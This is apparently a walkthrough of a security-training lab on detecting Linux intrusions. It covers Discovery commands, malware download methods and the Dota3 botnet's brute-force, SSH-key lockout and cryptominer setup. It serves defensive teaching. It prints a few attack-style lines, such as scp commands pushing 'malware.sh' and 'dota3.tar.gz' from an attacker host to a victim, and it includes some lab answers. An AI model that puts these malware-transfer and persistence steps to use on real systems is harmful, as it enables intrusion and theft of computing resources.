## Task 2: Discovery Overview
### Discovery
Imagine suddenly appearing in a Linux system, and all you see is a command-line interface. Your first question would be about where you are and how you appeared there, right? Interestingly, this is how most Linux breaches start for attackers. This is because botnets usually automate the Initial Access, and human attackers join only when an entry point is ready.

### First Actions
The first discovery commands threat actors run on the Linux systems are usually the same, no matter which entry point they used and the goal they pursue. The only exception when Discovery is skipped is when the attackers already know their target or simply want to install a cryptominer and exit, no matter who the victim is. Let's see some basic Discovery examples:
<img width="1235" height="321" alt="image" src="https://github.com/user-attachments/assets/6aef25df-a3e3-479d-9039-268a5c2e5d74" />

### Lab
**Q1: Run systemd-detect-virt to detect the system's cloud.
What is the command's output you discovered?**
<img width="583" height="94" alt="image" src="https://github.com/user-attachments/assets/484ca9ac-a688-43e1-b7d0-1e189e4b7478" />

**Q2: Now run ps aux and look for EDR or antivirus processes.
What is the full path to the detected antimalware binary?**
<img width="1016" height="107" alt="image" src="https://github.com/user-attachments/assets/b2bb8e5f-3271-49a0-9f0b-792f084d366e" />


## Task 3: Detecting Discovery
### Specialized Discovery
After the initial Discovery, threat actors might also utilize more focused commands to achieve their goals: Data stealers look for passwords and secrets to collect, cryptocurrency miners query CPU and GPU information to optimize the mining, and botnet scripts scan the network for new victims. Some malware can also combine all three objectives. For example:
<img width="1236" height="256" alt="image" src="https://github.com/user-attachments/assets/eca8ddae-e3e3-4b07-8408-5f4e7829cae7" />

### Detecting Discovery
Detecting Discovery commands is straightforward with auditd or other runtime monitoring tools. First, configure auditd to log the right commands, like those shown in this room. Then, hunt for Discovery using a SIEM or ausearch. But the real challenge is deciding if the commands came from an attacker, a legitimate service, or an IT administrator.
<img width="1583" height="400" alt="image" src="https://github.com/user-attachments/assets/62df7c6d-e827-4d43-80b3-09676efca40d" />

It is very important to get the context of the Discovery commands. For example, it's a red flag when a web server suddenly spawns whoami or when your IT member starts looking for secrets with find and grep. On the other hand, a network monitoring tool is often expected to periodically ping the local network. You can get that context by building a process tree, for example:
* *ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami*
* *ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script*
* *ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh*

### Lab
**Q1: What is the path of the script that initiated the "hostname" command?**
<img width="763" height="69" alt="image" src="https://github.com/user-attachments/assets/f0868466-ebb5-4582-bc59-262797b98668" />

**Q2: What was the last Discovery command launched by the script?**
<img width="766" height="86" alt="image" src="https://github.com/user-attachments/assets/94c6358f-a021-40ea-ab78-5fb6e49b07ee" />

**Q3: Looking at the script content, what's the email of the script author?**
<img width="657" height="554" alt="image" src="https://github.com/user-attachments/assets/26bbe613-ff60-4525-a277-6785197c3999" />

## Task 4: Motivation for Attacks
### Hack and Forget Attacks
After the Discovery stage, threat actors usually reveal their motivation by installing specialized malware or taking actions unique to some class of attack. Before jumping into the technical review, let's consider the common goals of attackers when breaching Linux. They can be organized into two informal categories: "Hack and Forget" and targeted attacks. In this room, let's focus on the "Hack and Forget" ones. \

**"Hack and Forget" Attacks** 
These attacks run at scale and focus on quick gains. For example, a threat group may continuously scan the Internet for an exposed SSH with a "tryguessme" password and get a few victims every month. Then, after a quick discovery, the attack usually ends up in one of three scenarios below (or three scenarios at once):

* Install Cryptominer: Earn money by using the victim's CPU/GPU to mine cryptocurrency
* Enroll to Botnet: Add the victim to a botnet (e.g. Mirai(opens in new tab)) and use it for tasks like DDoS
* Use as Proxy: Use the victim to send phishing, host malware, or route the attacker's traffic

### Ingreess Tool Transfer
So, how do the threat actors continue the attack and download malware like cryptominer to their Linux victim? In MITRE terms, how do they perform Ingress Tool Transfer(opens in new tab)? There are many ways, but in the vast majority of cases, they utilize one of these three preinstalled commands:
<img width="1233" height="260" alt="image" src="https://github.com/user-attachments/assets/0da48f48-5272-4c83-9a52-c88d45817c77" />
Like other process creation events, the commands above can be logged with auditd and sometimes appear in Bash history. However, there is a case where process logs aren't helpful. If the victim is reachable over SSH, an attacker can run scp or sftp from their own system. In this case, you won't see the command on the victim's auditd logs, but you will see a new SSH login! The same principle applies to other file transfer services such as FTP or SMB. Let's see an example:
* *attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp*
* *ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp*

### Lab
**Q1: From which domain was the Elastic agent downloaded?**
<img width="766" height="64" alt="image" src="https://github.com/user-attachments/assets/1fc0122f-7810-4efc-ac57-7b1286cfb457" />

**Q2: What is the full path to the downloaded "helper.sh" script?**
<img width="765" height="64" alt="image" src="https://github.com/user-attachments/assets/707cb6fb-1e94-4ecc-a8ee-c91e854e1ca4" />

**Q3: Which of the downloaded files is more likely to be malicious:
The one downloaded with curl or wget?**
* curl

## Task 5: Dota3: First Actions
### Dota 3 Malware Analysis
**Initial Access**
* The botnet of more than 2000 distinct IPs across 94 countries scans the Internet for systems with open SSH
* The botnet brute-forces the systems, mainly targeting the root user and trying the top 1000 weak passwords
* If the password was guessed, one of the botnet hosts accesses the victim via SSH and continues the attack

**Discovery**
* Next, from within the SSH session, the threat actor automates the Discovery by running multiple commands in quick succession. Even from the first three lines below, you may conclude it is a cryptominer infection, as there is a low chance that other malware will ever need to know the victim's CPU and RAM information.

**Persistence**
* Although we haven't covered Persistence in this room, the next actions are simple to understand: the first command changes the password of the breached "ubuntu" user to a more complex one (to secure the victim from being breached by competitor botnets!), and the following commands replace all SSH keys with the malicious one (to lock out the system owner from accessing their server). This is all to ensure reliable access to the victim when needed.

### Detecting the Attack
Nothing complicated so far, right? Still, Dota3 remains active because many administrators set weak SSH passwords. In a real SOC with SIEM, you would likely receive multiple alerts: SSH login from a known malicious IP, a spike of Discovery commands, and a match for the attack string "mdrfckr". You can also spot the attack manually using the two methods below:
<img width="1235" height="196" alt="image" src="https://github.com/user-attachments/assets/942d5aff-f304-45ac-8dc8-41b63d6654b6" />

### Lab 
**Q1: Which IP address managed to brute-force the exposed SSH?**
<img width="767" height="132" alt="image" src="https://github.com/user-attachments/assets/53d4ca7d-3da6-4c50-b1f4-2441c85a26ed" />

**Q2: Which command did the attacker use to list the last logged-in users?**
<img width="752" height="46" alt="image" src="https://github.com/user-attachments/assets/dce9e6ac-287f-49bf-af72-97d371b3ba0c" />

**Q3: Which three EDR processes did the attacker look for with "egrep"?**
<img width="765" height="213" alt="image" src="https://github.com/user-attachments/assets/b77b338b-d832-46fa-acfc-48abbdbc316b" />

## Task 6: Dota3: Miner Setup
### Cryptominer Setup
Continuing the Dota3 infection chain, the threat actors have maintained their presence on the victim and now decide whether to install a cryptominer and supplementary malware. Since they already have SSH access, they simply upload the tools via SCP using the previously changed password. Below is an example of how it works:
* user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
* [OK] Transfered dota3.tar.gz file to the victim
After transferring the tools (dota3.tar.gz), the attackers unpack them into a hidden folder under /tmp, a common location for staging temporary malware. Take a look at the commands below and notice how strangely the created directories are named. This is to resemble legitimate software and discourage the IT team from investigating further upon detection.
<img width="941" height="221" alt="image" src="https://github.com/user-attachments/assets/8981c141-37f3-4d4f-8bb8-a89fc9debf47" />

Lastly, the threat actors execute two binaries from the archive. The first, tsm, is a customized network scanner that probes the internal network for other systems with exposed SSH services. The second, initall, is an XMRig cryptominer that loads the victim's CPU to generate revenue for the attackers. Pay attention that both binaries are launched with nohup, a command that allows the processes to continue running in the background even after the SSH session is closed.
<img width="941" height="216" alt="image" src="https://github.com/user-attachments/assets/bf5b6a26-95d0-4ac9-9e58-add1de8e6943" />

### Detecting the Attack
Throughout the room, you learned how to use logs to hunt for different malicious processes, and the detection of Dota3 infection is no different! Here, the common indicators your SOC rules or EDR alerts would react upon are:

* Auditd logs: Creation of untrusted, hidden files and folders in the /tmp directory
* Auditd logs: Creation of files named like known malware, such as dota3.tar.gz
* Auditd logs: Usage of commands often observed in attacks, such as nohup
* Network traffic: SSH port scan of the whole 192.168.* and 172.16.* networks
* EDR solution: The XMrig cryptominer binary is blocked by most EDRs (VirusTotal Example)

### Lab
**Q1: What is the name of the malicious archive that was transferred via SCP?**
<img width="768" height="70" alt="image" src="https://github.com/user-attachments/assets/267cc779-466e-4061-bc3c-3d2b3605492e" />

**Q2: What was the full command line of the cryptominer launch?**
<img width="762" height="66" alt="image" src="https://github.com/user-attachments/assets/9c4b9390-1947-4a1e-8a6b-f92e1a8d511b" />


**Q3: Which IP address range did the attacker scan for an exposed SSH?**
<img width="767" height="675" alt="image" src="https://github.com/user-attachments/assets/193cae16-1341-481b-8bf0-6a865a7781a4" />




















